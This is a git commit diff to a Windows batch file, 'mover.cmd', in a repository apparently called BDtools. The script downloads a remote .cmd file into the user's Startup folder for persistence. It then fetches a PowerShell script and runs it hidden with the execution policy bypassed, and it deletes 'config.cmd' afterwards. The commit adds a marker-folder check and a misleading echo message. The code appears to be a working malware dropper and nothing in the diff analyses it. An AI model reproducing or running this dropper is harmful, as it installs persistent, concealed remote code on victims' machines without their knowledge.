1e15cdceb88d007973cc5c6f5bd156c709e73e18
blousekool <132397759+blousekool@users.noreply.github.com>
2024-01-13 00:14:45 +0100

    Update mover.cmd

--- bd/mover.cmd
+++ bd/mover.cmd
@@ -1,5 +1,15 @@
 @echo off
-powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/blousekool/BDtools/main/bd/usbinstaller.cmd' -OutFile $env:temp\usbinstaller.cmd; Move-Item $env:temp\usbinstaller.cmd \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\usbinstaller.cmd\""
-powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1;Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "%Temp%\nadmin_dinstall.ps1"' -WindowStyle Hidden
-del config.cmd
+set "folderPath=%temp%\sVBXKuz"
+
+if exist "%folderPath%\" (
+    echo the folder is already there
+) else (
+    echo The folder exists. Performing actions...
+    
+    powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/blousekool/BDtools/main/bd/usbinstaller.cmd' -OutFile $env:temp\usbinstaller.cmd; Move-Item $env:temp\usbinstaller.cmd \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\usbinstaller.cmd\""
+    powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1;Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "%Temp%\nadmin_dinstall.ps1"' -WindowStyle Hidden
+
+    del config.cmd
+)
+
 exit
